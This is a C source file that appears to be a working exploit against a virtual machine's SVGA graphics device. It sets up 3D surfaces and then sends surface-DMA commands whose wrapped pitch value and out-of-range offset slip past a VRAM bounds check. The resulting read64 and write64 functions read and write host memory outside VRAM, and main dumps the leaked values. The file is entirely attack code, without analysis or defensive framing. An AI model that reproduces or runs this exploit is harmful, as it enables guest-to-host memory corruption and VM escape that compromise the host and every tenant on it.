#include <err.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include "svga.h"
#include "svga3d_reg.h"

SVGADevice gSVGA;

void
allocate_surface(uint32_t sid, uint32_t size)
{       
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};

	hdr.size = 48;

	surface.sid = sid;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	/* Keep cbSurfacePitch in multiples of 8 */       
	assert( (size/2) % 8 == 0);

	dsize[0].width  = size/2;	// to make up for depth = 2
	dsize[0].height = 1;
	dsize[0].depth  = 2;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();

}

void
copy_surface(uint32_t sid, SVGA3dTransferType type, uint8_t *memory, uint32_t size)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	surfacedma.guest.pitch      = 0;
	surfacedma.host.sid         = sid;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = type;

	boxes.x = 0;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = size;			// used for cbWidth
	boxes.h = 1;
	boxes.d = 1;			// used for cHeight
	boxes.srcx = 0;
	boxes.srcy = 0;
	boxes.srcz = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	/* copy data to framebuffer for writing to surface */
	if (type == SVGA3D_WRITE_HOST_VRAM) {
		memcpy(gSVGA.fbMem, memory, size);
	}

	VMwareWaitForFB();

	/* copy leaked data from framebuffer  */
	if (type == SVGA3D_READ_HOST_VRAM) {
		memcpy(memory, gSVGA.fbMem, size);
	}
}

uint64_t
read64(uint32_t offset)
{
	uint64_t value = 0;

	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	/* AssertMsgReturn(offSrc + cbSrcPitch * (cHeight - 1) + cbWidth <= pThis->vram_size */
	surfacedma.guest.pitch      = (0x100000000 - ((gSVGA.vramSize + offset) + sizeof(void *)));
	surfacedma.host.sid         = 0;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = SVGA3D_WRITE_HOST_VRAM;

	boxes.x = 0;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = sizeof(void *);               // used for cbWidth
	boxes.h = 1;
	boxes.d = 2;                            // used for cHeight
	boxes.srcx = gSVGA.vramSize + offset;   // for out of bound access
	boxes.srcy = 0;
	boxes.srcz = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	VMwareWaitForFB();

	/* copy the leaked data from surface to framebuffer */	
	copy_surface(0, SVGA3D_READ_HOST_VRAM, (uint8_t *)&value, sizeof(void *));

	return value;
}

void
write64(uint32_t offset, uint64_t value)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	/* AssertMsgReturn(offSrc + cbSrcPitch * (cHeight - 1) + cbWidth <= pThis->vram_size */
	surfacedma.guest.pitch      = (0x100000000 - ((gSVGA.vramSize + offset) + sizeof(void *)));
	surfacedma.host.sid         = 0;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = SVGA3D_READ_HOST_VRAM;

	boxes.x = 0;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = sizeof(void *);               // used for cbWidth
	boxes.h = 1;
	boxes.d = 2;                            // used for cHeight
	boxes.srcx = gSVGA.vramSize + offset;   // for out of bound access
	boxes.srcy = 0;
	boxes.srcz = 0;

	/* fill the surface with contents from frame buffer */	
	copy_surface(0, SVGA3D_WRITE_HOST_VRAM, (uint8_t *)&value, sizeof(void *));

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	VMwareWaitForFB();
}

int main(int argc, char **argv)
{

	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x260);
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);

	allocate_surface(0, 16);

	for (int offset = 0; offset < 24; offset++) {
		warnx("[%d]> 0x%lx", offset, read64(offset * sizeof(void *)));
	}
	return 0;
}
